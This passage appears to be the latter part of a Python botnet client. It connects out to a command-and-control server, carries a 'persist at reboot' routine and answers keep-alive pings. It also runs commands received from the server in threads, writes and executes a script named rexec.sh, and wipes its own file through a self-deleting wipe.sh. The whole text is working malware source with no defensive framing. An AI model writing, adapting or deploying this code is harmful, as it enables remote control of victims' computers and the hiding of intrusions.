            file.write(content)
        
        os.system('chmod +x rexec.sh')
        os.system('sh rexec.sh')
    except:
        pass

def _rslv(_host):
    _host = _host.lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = 'http://' + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _ip, _domain
    except:
        return '', ''

def _sheol():
    with open('wipe.sh', 'w') as f:
        f.write('sleep 5 && rm -f "' + __file__ + '" && rm -f $0')
        f.close()
    os.system('chmod +x wipe.sh')
    os.system('sh wipe.sh')
    sys.exit()

def main():
    # IP/Port to C2 server
    EIP = '0.0.0.0'
    PRT = 4444
    
    
    # ensure client run @ reboot
    _persist()
    
    global client, _sync
    try:
        # establish socket connection to C2
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        client.connect((EIP, int(PRT)))

        # inform C2 to client connection
        client.send('Armory call!'.encode())
        print('[*] Synchronizing with C2...')
        
        while _sync:
            # wait for incoming C2 command
            data = client.recv(1024)
            
            # successful C2 synchronization
            if data.decode() == "Welcome to the NET!":
                print('[!] Connected to Exile!')
                
            # connection reset error / transmission cut-off
            elif data.decode().lower() == '':
                print('[!] Anomaly detected in transmission! Ignoring...')
                
            # response to keep alive request
            elif data.decode().lower() == 'ping':
                print('[*] Responding to C2 keep-alive...')
                client.send('pong'.encode())
                
            # C2 command detected. process information
            else:
                proc = threading.Thread(target=_process, args=(data.decode(),))
                proc.start()
                
    except KeyboardInterrupt:
        client.close()
        sys.exit('[!] Aborting...')
    except ConnectionRefusedError:
        client.close()
        print('[!] C2 unresponsive/down! Reconnecting in 30 seconds...')
        time.sleep(30)
        main()
    except ConnectionResetError:
        print('[-] Transmission reset! Reconnecting in 30 seconds...')
        time.sleep(30)
        main()
    except OSError:
        # reconnect/disconnect caused interrupt in .recv()
        pass
            
    sys.exit('[x] Client offline...')

if __name__ == "__main__":
    main()
